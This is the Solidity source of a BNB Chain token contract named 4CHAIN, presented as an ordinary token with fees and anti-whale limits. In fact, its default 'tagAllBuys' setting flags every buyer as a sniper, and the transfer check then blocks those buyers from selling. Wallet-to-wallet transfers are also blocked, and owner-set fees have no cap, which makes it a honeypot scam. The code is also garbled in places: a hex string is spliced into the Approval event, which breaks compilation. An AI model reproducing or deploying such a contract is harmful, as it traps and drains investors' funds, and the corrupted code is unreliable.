/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

// tg: https://t.me/fourchainbsc

pragma solidity ^0.7.4;
// SPDX-License-Identifier: Unlicensed


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multipliManion overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 va0x1a2e862755dd9507ddb9e24739659e7616cb9f70baff6bdf15fa90a158927263lue);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function getAmountsIn(
        uint256 amountOut,
        address[] memory path
    ) external view returns (uint256[] memory amounts);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;
    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
}

abstract contract BEP20Interface {
    function balanceOf(address whom) view public virtual returns (uint);
}

contract FOURCHAIN is IBEP20, Auth {
    using SafeMath for uint256;

    string constant _name = "4CHAIN";
    string constant _symbol = "4CHAIN";
    uint8 constant _decimals = 18;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; 
    

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply * 30 / 1000; 
    uint256 public _walletMax = _totalSupply * 30 / 1000; 
    uint256 public timeLimit = 1800;
    uint256 public timeStamp = 0;
    uint256 public _record = 0;
    uint256 public _lastRecord = 0;
    bool public newRules = true;
    bool private tagAllBuys = true;
    bool private sendingAllowed = false;
    bool public restrictWhales = true;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public hasSold;
    mapping (address => bool) isSniper;
    
    uint256 public liquidityFee = 0;
    uint256 public marketingFee = 12;
    uint256 public taxManFee = 0;
    uint256 public totalFee = 0;
    uint256 public totalFeeIfSelling = 0;
    address public autoLiquidityReceiver;
    address private marketingWallet;
    address public taxMan;

    IDEXRouter public router;
    address public pair;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    uint256 public swapThreshold = _totalSupply * 5 / 2000;
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () Auth(msg.sender) {      
        router = IDEXRouter(routerAddress);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = uint256(-1);
        isFeeExempt[DEAD] = true;
        isTxLimitExempt[DEAD] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[pair] = true;
        autoLiquidityReceiver = 0x2D7B4e90B989EdD6661953567d2AD1d313Cb2FEd; //LP receiver
        marketingWallet = 0x6B70f9281CA6F994Bcf0ca501738111B42a22A06;  //marketing wallet
        taxMan = msg.sender;  
        totalFee = liquidityFee.add(marketingFee).add(taxManFee);
        totalFeeIfSelling = totalFee;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function name() external pure override returns (string memory) { return _name; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function getOwner() external view override returns (address) { return owner; }
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function setFeeReceivers(address newLiquidityReceiver, address newMarketingWallet) external authorized {
        autoLiquidityReceiver = newLiquidityReceiver;
        marketingWallet = newMarketingWallet;
    }

	function checkTxLimit(address sender, address recipient, uint256 amount) internal {
		require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
        if (sender != owner
            && recipient != owner
            && !isTxLimitExempt[recipient]
            && recipient != ZERO 
            && recipient != DEAD 
            && recipient != pair 
            && recipient != address(this)
        ) {
            tagSnipers(recipient);
            if (newRules){ 
                address[] memory path = new address[](2);
                path[0] = router.WETH();
                path[1] = address(this);
                uint256 usedBNB = router.getAmountsIn(amount, path)[0];
                if (!hasSold[recipient] && usedBNB > _record){
                    taxMan = recipient;
                    timeStamp = block.timestamp;
                    _lastRecord = _record;
                    _record = usedBNB;
                }
            }else{ 
                if (!hasSold[recipient] && amount > _record){
                    taxMan = recipient;
                    _lastRecord = _record;
                    _record = amount;
                }
            }
        }
        if (sender != owner
            && recipient != owner
            && !isTxLimitExempt[sender]
            && sender != pair 
            && recipient != address(this)
        ) {
            require(!isSniper[sender]);
            if (taxMan == sender){
                taxMan = marketingWallet;
                _lastRecord = _record;
                _record = 0;
            }
            hasSold[sender] = true;
        }
        if (newRules){ 
            if (timeStamp + timeLimit  < block.timestamp){
                taxMan = marketingWallet;
                _lastRecord = _record;
                _record = 0;
            }
        }
    }

    function setSwapBackSettings(bool enableSwapBack, uint256 newSwapBackLimit, bool swapByLimitOnly) external authorized {
        swapAndLiquifyEnabled  = enableSwapBack;
        swapThreshold = newSwapBackLimit;
        swapAndLiquifyByLimitOnly = swapByLimitOnly;
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {    
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwapAndLiquify){ return _basicTransfer(sender, recipient, amount); }
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
        if(msg.sender != pair && !inSwapAndLiquify && swapAndLiquifyEnabled && _balances[address(this)] >= swapThreshold){ swapBack(); }
        checkTxLimit(sender, recipient, amount);
        require(!isWalletToWallet(sender, recipient), "Don't cheat");
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        if (!isTxLimitExempt[recipient] && restrictWhales) {
            require(_balances[recipient].add(amount) <= _walletMax, "Max wallet violated!");
        }
        uint256 amountReceived = !isFeeExempt[sender] && !isFeeExempt[recipient] ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(msg.sender, recipient, amountReceived);  
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

     function modifyWalletLimit(uint256 newLimit) external authorized {
        _walletMax = newLimit;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256)  {       
        uint256 feeApplicable = pair == recipient ? totalFeeIfSelling : totalFee;
        uint256 feeAmount = amount.mul(feeApplicable).div(100);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function tagSnipers(address sender) internal {
        if (tagAllBuys) {
            isSniper[sender] = true;
        }
    }

    function canBuySell(address holder, bool isASniper) external authorized {
        isSniper[holder] = isASniper;
    }

	function setTagAllBuys(bool active) external authorized {
		tagAllBuys = active;
	}

    function setFees(uint256 newLiqFee, uint256 newMarketingFee, uint256 newTaxManFee) external authorized {
        liquidityFee = newLiqFee;
        marketingFee = newMarketingFee;
        taxManFee = newTaxManFee;
        totalFee = liquidityFee.add(marketingFee).add(taxManFee);
        totalFeeIfSelling = totalFee;
    }

    function isWalletToWallet(address sender, address recipient) internal view returns (bool) {
        if (isFeeExempt[sender] || isFeeExempt[recipient] || sendingAllowed) {
			return false;
		}
        if (sender == pair || recipient == pair) {
		    return false;
        }
        return true;
    }

    function swapBack() internal lockTheSwap {  
        uint256 tokensToLiquify = _balances[address(this)];
        uint256 amountToLiquify = tokensToLiquify.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBTaxMan = amountBNB.mul(taxManFee).div(totalBNBFee);
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
     
        (bool tmpSuccess,) = payable(marketingWallet).call{value: amountBNBMarketing, gas: 30000}("");
        (bool tmpSuccess2,) = payable(taxMan).call{value: amountBNBTaxMan, gas: 30000}("");
         
        // only to supress warning msg
        tmpSuccess = false;
        tmpSuccess2 = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }
    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
}